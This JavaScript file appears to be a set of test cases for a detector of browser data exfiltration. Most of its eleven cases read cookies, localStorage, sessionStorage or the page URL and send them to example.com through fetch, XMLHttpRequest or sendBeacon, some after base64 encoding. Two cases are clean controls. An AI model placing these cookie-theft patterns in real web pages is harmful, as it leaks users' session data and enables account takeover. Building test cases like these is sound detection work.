// ============================================================
// TEST 1
// Browser cookie -> fetch
// ============================================================

const cookieData = document.cookie;

fetch("https://example.com/cookie", {
    method: "POST",
    body: cookieData
});


// ============================================================
// TEST 2
// localStorage -> fetch
// ============================================================

const localData = localStorage.getItem("userData");

fetch("https://example.com/local", {
    method: "POST",
    body: localData
});


// ============================================================
// TEST 3
// sessionStorage -> fetch
// ============================================================

const sessionData = sessionStorage.getItem("sessionData");

fetch("https://example.com/session", {
    method: "POST",
    body: sessionData
});


// ============================================================
// TEST 4
// location -> fetch
// ============================================================

const currentPage = window.location.href;

fetch("https://example.com/location", {
    method: "POST",
    body: currentPage
});


// ============================================================
// TEST 5
// cookie -> btoa -> fetch
// ============================================================

const encodedCookie = btoa(cookieData);

fetch("https://example.com/encoded", {
    method: "POST",
    body: encodedCookie
});


// ============================================================
// TEST 6
// cookie -> function return -> fetch
// ============================================================

function getCookieData() {
    return document.cookie;
}

const returnedCookie = getCookieData();

fetch("https://example.com/return", {
    method: "POST",
    body: returnedCookie
});


// ============================================================
// TEST 7
// cookie -> function parameter -> fetch
// ============================================================

function transmit(data) {
    fetch("https://example.com/parameter", {
        method: "POST",
        body: data
    });
}

transmit(cookieData);


// ============================================================
// TEST 8
// Normal network request WITHOUT sensitive data
// ============================================================

fetch("https://example.com/normal", {
    method: "GET"
});


// ============================================================
// TEST 9
// WebSocket WITHOUT sensitive data
// ============================================================

const socket = new WebSocket(
    "wss://example.com/socket"
);


// ============================================================
// TEST 10
// XMLHttpRequest with cookie data
// ============================================================

const xhr = new XMLHttpRequest();

xhr.open(
    "POST",
    "https://example.com/xhr"
);

xhr.send(cookieData);


// ============================================================
// TEST 11
// sendBeacon with cookie data
// ============================================================

navigator.sendBeacon(
    "https://example.com/beacon",
    cookieData
);